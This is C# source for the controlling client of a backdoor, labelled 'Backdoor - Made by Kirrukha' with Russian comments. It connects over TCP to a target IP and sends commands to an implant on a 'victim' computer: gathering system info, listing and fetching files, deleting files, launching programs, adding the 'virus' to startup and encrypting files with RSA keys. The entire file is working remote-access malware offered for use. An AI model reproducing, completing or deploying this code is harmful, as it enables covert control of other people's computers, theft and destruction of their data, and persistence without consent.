using System;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Cliente
{
    class Client
    {
        public static bool isConnected;
        public static string received_data;
        public static NetworkStream Receiver; //для получения данных с сервера
        public static NetworkStream Writer; //для отправки команд серверу
        public static int port = 9486;

        #region Commands
        public static void SendCommand(string Command)
        {
            try
            {
                string[] mainCommand = System.Text.RegularExpressions.Regex.Split(Command, ">");
                RSACryptoServiceProvider RsaKey = new RSACryptoServiceProvider();
                string publickey = RsaKey.ToXmlString(false);
                string privatekey = RsaKey.ToXmlString(true);

                switch (mainCommand[0])
                {
                    case "Info":
                        byte[] Packet = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet, 0, Packet.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;
                        
                    case "ShowFiles":
                        byte[] Packet1 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet1, 0, Packet1.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "ShowFolders":
                        byte[] Packet2 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet2, 0, Packet2.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "GetFile":
                        byte[] Packet3 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet3, 0, Packet3.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;
                            
                    case "EncryptFile":
                        byte[] Packet4 = Encoding.ASCII.GetBytes(Command + ">" + publickey);
                        Writer.Write(Packet4, 0, Packet4.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "DecryptFile":
                        byte[] Packet5 = Encoding.ASCII.GetBytes(Command + ">" + privatekey);
                        Writer.Write(Packet5, 0, Packet5.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "OpenApp":
                        byte[] Packet6 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet6, 0, Packet6.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "Msg":
                        byte[] Packet7 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet7, 0, Packet7.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "Del":
                        byte[] Packet8 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet8, 0, Packet8.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "OpenWebSite":
                        byte[] Packet9 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet9, 0, Packet9.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "AddToStartup":
                        byte[] Packet10 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet10, 0, Packet10.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;

                    case "KillBackDoor":
                        byte[] Packet11 = Encoding.ASCII.GetBytes(Command);
                        Writer.Write(Packet11, 0, Packet11.Length);
                        Writer.Flush();
                        ReceiveData();
                        Console.WriteLine(received_data);
                        received_data = "";
                        break;
                }

            }
            catch(Exception ex)
            {                
                isConnected = false;
                Console.WriteLine(ex.ToString() + "\nDisconnected from server!");
                Console.ReadKey();
                Writer.Close();
            }
        }

        public static void ReceiveData()
        {
            while (true)
            {
                Thread.Sleep(10);
                try
                {
                    byte[] RecPacket = new byte[100000];
                    Receiver.Read(RecPacket, 0, RecPacket.Length);
                    Receiver.Flush();
                    string data = Encoding.UTF8.GetString(RecPacket);
                    received_data = data.Trim('\0');

                    break;
                }
                catch
                {
                    break;
                }
            }
        }
        
        #endregion

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Title = "Client - Offline";
            
            TcpClient Connector = new TcpClient();

            Console.WriteLine("Backdoor - Made by Kirrukha");
            Console.WriteLine("Enter server IP :");
            string IP = Console.ReadLine();

            try
            {
                Connector.Connect(IP, port);
                isConnected = true;
                
                Console.Title = "Client - Online";

                //Writer и Receiver получат поток
                Writer = Connector.GetStream();
                Receiver = Connector.GetStream();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error connecting to target server ! \nPress any key to restart the program.");
                Console.ReadKey();
                Environment.Exit(0);
            }
            Console.WriteLine("Connection successfully established to " + IP);
            Console.WriteLine("Type help for a list of available commands.");

            while (isConnected)
            {
                Console.WriteLine("Door> ");
                string command = Console.ReadLine();

                if (command == "Help>")
                {
                    Console.WriteLine("_____COMMANDS_____");
                    Console.WriteLine(" - 'Info>' //Информация о компе жертвы");
                    Console.WriteLine(" - 'Msg>Hello World!' //Вывод сообщений на экране");
                    Console.WriteLine(" - 'ShowFolders>D:\\example' //Просмотр подпапок в указанной папке");
                    Console.WriteLine(" - 'ShowFiles>D:\\example' //Просмотр файлов в указанной папке");
                    Console.WriteLine(" - 'OpenApp>chrome.exe' //Открыть программу или файл");
                    Console.WriteLine(" - 'GetFile>D:\\example\\file.exe' //Отправить файл на адрес электронной почты"); 
                    Console.WriteLine(" - 'Del>D:\\example\\file.exe' //Удаление указанного файла");
                    Console.WriteLine(" - 'OpenWebSite>http://example.com' //Открыть сайт в iexplorer");
                    Console.WriteLine(" - 'AddToStartup>' //Добавить вирус в автозагрузку");
                    Console.WriteLine(" - 'KillBackDoor>' //Оставить в покое этого пользователя");
                    Console.WriteLine(" - 'EncryptFile>' //Шифрование");
                    Console.WriteLine(" - 'DecryptFile>' //Дешифрование");
                }
                else
                {
                    SendCommand(command);
                }
            }
        }
    }
}